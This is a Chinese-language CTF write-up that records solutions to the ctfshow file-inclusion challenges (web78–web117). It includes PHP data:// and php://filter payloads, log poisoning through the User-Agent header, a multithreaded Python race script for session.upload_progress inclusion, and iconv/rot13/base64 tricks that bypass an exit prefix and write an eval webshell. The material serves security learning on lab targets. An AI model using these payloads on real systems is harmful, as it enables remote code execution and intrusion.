---
title: ctfshow文件包含刷题
date: 2022-01-25 16:08:59
tags:
      - 文件包含
      - ctfshow
      - web
categories: ctfshow
---

ctfshow文件包含做题记录<!--more-->

### web78

本题就是最基础的利用php:filter伪协议读取flag.php源码

### web79

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

本题会将php替换成???

尝试使用大写绕过

pHp://filter/read=convert.base64-encode/resource=flag.php

但是php伪协议的格式是固定的,不能改为大写字母

最后用data伪协议来执行命令,记得要将`+`手动urlencode

payload`file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKT8%2b`

### web80

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

本题把data伪协议也做掉了

nginx默认日志路径`/var/log/nginx/access.log`

通过包含日志中的访问记录,但是日志文件中的符号被自动url编码了



![image-20220125170016133](https://gitee.com/blue_satchel/images/raw/master/image-20220125170016133.png)

突然想起来好像做自动编码的是浏览器,那抓包把符号编码还原就能解决问题了

修改了字符编码后,发现请求变成400,并且未被日志文件记录,观察日志文件,每次都记录的还有UA头

`<?php system('tac flag.php')?>`

![image-20220125171556573](https://gitee.com/blue_satchel/images/raw/master/image-20220125171556573.png)

本题留下一个疑问,为什么在日志文件中不会留下插入的php代码,而是会留下代码的执行结果

![image-20220125171842751](https://gitee.com/blue_satchel/images/raw/master/image-20220125171842751.png)

### web81

解法同上

### web82

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```



先尝试了和上面一样的日志文件包含,失败了,日志文件不在默认路径了

黔驴技穷了.....查看提示,是利用session.upload_progress进行文件包含的,记录下学习过程

当一个上传在处理中,同时POST一个与INI中设置的`session.upload_progress.name`同名的变量时,上传进度可以在`$_SESSION`中获得,当PHP检测到这种POST请求时,它会在`$_SESSION`中添加一组数据,索引是`session.upload_progress.prefix`和`session.upload_progress.name`连接在一起的值

在php.ini中有以下几个默认选项

```properties
session.upload_progress.enabled = on
session.upload_progress.cleanup = on
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
session.upload_progress.freq = "1%"
session.upload_progress.min_freq = "1"
```

`enable=on`表示upload_progress功能开启,当浏览器向服务器上传一个文件时,php会把此次文件上传的详细时间(如上传时间,上传进度等)存储在session中

`cleanup=on`表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；

`name`当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；

`prefix+name`将表示为session中的键名

一个session中的重要选项

`session.use_strict_mode=off`这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要

我们可以利用`session.upload_progress`将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。

**问题一**

代码里没有`session_start()`,如何创建session文件呢。

**解答一**

其实，如果`session.auto_start=On` ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。

<label style="background:yellow">但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get("session.upload_progress.prefix")+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</label>

**问题二**

默认配置`session.upload_progress.cleanup = on`导致文件上传后，session文件内容立即清空，如何进行rce

可以利用竞争,在session文件内容清空前进行包含利用

----

明白了原理之后模仿他人的wp用burp的intruder模块进行了尝试,但是都以失败告终,大多都是503错误

尝试编写多线程python脚本来解题,顺便学习一下python多线程

经过尝试之后,发现ctfshow对访问速度做了限制,这题没法做了,于是尝试在本地进行复现,因为是windows的原因,无法通过目录包含该文件,对截图了session中写入的内容,确实是有代码在里面

![image-20220127002641787](https://gitee.com/blue_satchel/images/raw/master/image-20220127002641787.png)

----

##### payload

最后在本地linux虚拟机搭建了对应环境,不做请求速率限制,成功包含并执行命令,503的原因就是ctfshow平台做了限制

如果在知道当前页面在服务器的路径的情况下,使用file_put_contents函数写一句话会方便很多

```python
'''
Description: 
Autor: blueSatchel
Date: 2022-01-26 22:34:13
LastEditors: blueSatchel
LastEditTime: 2022-01-27 14:34:37
'''
import requests
import io
import threading
import time

url='http://192.168.86.129:1234/'
sessionid='blue'

def write(session):
    fileBytes=io.BytesIO(b'a'*1024*50)
    while True:
        response=session.post(url=url,data={
            'PHP_SESSION_UPLOAD_PROGRESS':'<?php system("ls");?>'
             },
             cookies={
                 'PHPSESSID':sessionid
             },
             files={
                 'file':('haha.jpg',fileBytes)
             }
             )

def read(session):
    while True:
        response=session.get(url=url+"?file=/tmp/sess_"+sessionid)
        if response.status_code==200:
            print('成功了!!')
            print(response.text)
            time.sleep(10000)#刹个车

if __name__ == '__main__':
    with requests.session() as session:
        for i in range (5):
            #这个地方args一定要加逗号,不然会报错
            threading.Thread(target=write,args=(session,)).start()
        for i in range (5):
            threading.Thread(target=read,args=(session,)).start()

```

![image-20220127143501854](https://gitee.com/blue_satchel/images/raw/master/image-20220127143501854.png)

### web83

和82一样,脚本在平台跑就会返回503,复制代码,自己复现即可

```php
<?php
session_unset();
session_destroy();
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);

    include($file);
}else{
    highlight_file(__FILE__);
}
```

本题多了一个session的销毁,但是我们使用的session是自行创建的,只要创建的够快,就能在它销毁之前包含进去,所以脚本依然可用

### web84

```php
system("rm -rf /tmp/*");
```

本题多了个删除命令,原理还是一样,创建的比删的快就能包含,脚本依然可用

### web85

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    if(file_exists($file)){
        $content = file_get_contents($file);
        if(strpos($content, "<")>0){
            die("error");
        }
        include($file);
    }
    
}else{
    highlight_file(__FILE__);
}
```

本题对包含的文件中的内容进行了过滤,不能包含`<`,可以尝试使用php伪协议data的base64编码来执行命令,但是这个session 中的upload_progress是一个序列化字符串,data并不能被识别

最后还是用脚本,多开几个线程,读写各10个线程

##### 哪里存在条件竞争

通过对得到的session中的字符串的观察,

![image-20220127002641787](https://gitee.com/blue_satchel/images/raw/master/image-20220127002641787.png)

![image-20220127143501854](https://gitee.com/blue_satchel/images/raw/master/image-20220127143501854.png)

<label style="background:yellow">发现上传完成后,字符串中就没有了我们控制的`PHP_SESSION_UPLOAD_PROGRESS`写入的对应的php语句,多个线程同时让它判断,就有可能判断到已经删除php语句的session,但是包含的时候又包含了刚刚写入php语句的session</label>

### web86

```php
<?php
define('还要秀？', dirname(__FILE__));
set_include_path(还要秀？);
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);

    
}else{
    highlight_file(__FILE__);
}
```

本题对包含的目录做了限制,为当前目录,但是还是可以使用上面的脚本通过条件竞争来绕过

我猜测原理可能是这样的:

set_include_path可能开启了一个用于判断每次包含的文件是否为后台脚本,每次包含的时候判断文件是否在设定的目录里面,但是传的过快,导致漏判了吧.........等完事查看该函数源码后再下结论

### web87

参考https://xz.aliyun.com/t/8163#toc-3

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);

    
}else{
    highlight_file(__FILE__);
}
```

本题对

看P神的博客,p神[原话](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

```php
<?php
$content = '<?php exit; ?>';
$content .= $_POST['txt'];
file_put_contents($_POST['filename'], $content);
$content在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？

幸运的是，这里的$_POST['filename']是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将$content解码，利用php base64_decode函数特性去除“死亡exit”。

众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。

所以，一个正常的base64_decode实际上可以理解为如下两个步骤：

<?php
$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);
base64_decode($_GET['txt']);
所以，当$content被加上了<?php exit; ?>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符<、?、;、>、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。

“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，"phpexita"被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<?php exit; ?>没有了。
```

同样,本题中的`urldecode($file)`也是可以控制协议的,按照base64编码范围`A-Za-z0-9,/,=,+`,后面的`<?php die('大佬别秀了');?>`解码的时候只有phpdie能被识别,解码的时候是四个一组,所以再随便凑两个字符给它

#### 最后payload

##### base64-decode

```
file=php://filter/write=convert.base64-decode/resource=1.php       ,进行url全编码两次绕过php过滤

content=content=aaPD9waHAgc3lzdGVtKCd0YWMgZionKTs+        ,aa为了满足phpdie解码凑够六个
```

##### rot13

算是一种移位编码,字母总共26个,移动两次13就回到了原点

```
file=php://filter/write=string.rot13/resource=1.php           ,还是进行两次url全编码
content=<?cuc flfgrz('gnp s*');>              //进行了一次rot13编码的样子
```

只是这种方法有点尴尬的是；因为我们生成的文件内容之中前面的`<?`不在字母范围呢,并没有分解掉，这时，如果服务器开启了短标签，那么就会被解析，所以所以后面的代码就会错误；也就失去了作用；

##### iconv

根据web117

该过滤器类似于iconv函数,可以将字符串每两个字符反转一次,两次反转就能转回来

```
file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php   
contents=?<hp pystsme"(at c*f)">?           
```

```php
$result = iconv("UCS-2LE","UCS-2BE", '<?php @eval($_POST[dotast]);?>');
echo "经过一次反转:".$result."\n";
echo "经过第二次反转:".iconv("UCS-2LE","UCS-2BE", $result);
//输出结果如下：
//经过一次反转:?<hp pe@av(l_$OPTSd[tosa]t;)>?
//经过第二次反转:<?php @eval($_POST[dotast]);?>
```





### web88

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
}
```

本题在于构造一个base64编码后没有特殊字符比如`+ =`的字符串,多变化尝试,好像`?>`一定会编码出加号

多尝试

payload

`PD9waHAgc3lzdGVtKCd0YWMgZionKTsgPz5hYWFh         ----<?php system('tac f*'); ?>aaaa`

### web116

compress.zlib

### web117

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
function filter($x){
    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
        die('too young too simple sometimes naive!');
    }
}
$file=$_GET['file'];
$contents=$_POST['contents'];
filter($file);
file_put_contents($file, "<?php die();?>".$contents);
```



本题类比于web87,也是利用伪协议控制编码,将死亡die()弄成四不像,顺利执行contents的内容

但是之前学的base64和rot13都被做掉了...........

看wp

`payload: file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php post:contents=?<hp pvela$(P_SO[T]1;)>?`

`convert.iconv.UCS-2LE.UCS-2BE`是一种过滤器,作用是将字符串每两位进行一次反转

和使用`iconv()`函数流数据作用相同`iconv ( string $in_charset , string $out_charset , string $str )`

```php
$result = iconv("UCS-2LE","UCS-2BE", '<?php @eval($_POST[dotast]);?>');
echo "经过一次反转:".$result."\n";
echo "经过第二次反转:".iconv("UCS-2LE","UCS-2BE", $result);
//输出结果如下：
//经过一次反转:?<hp pe@av(l_$OPTSd[tosa]t;)>?
//经过第二次反转:<?php @eval($_POST[dotast]);?>
```

payload

![image-20220127235139770](https://gitee.com/blue_satchel/images/raw/master/image-20220127235139770.png)

死亡die被弄成无法执行

![image-20220127235400664](https://gitee.com/blue_satchel/images/raw/master/image-20220127235400664.png)



----

至此ctfshow的文件包含题目全部完成,虽然大多都是没啥死路,看着网上的wp一点点做的,但是因为本来就菜,所以这样参照做了一遍,并且记录了下来,也是学习到了很多新的方法,感谢分享知识的大佬

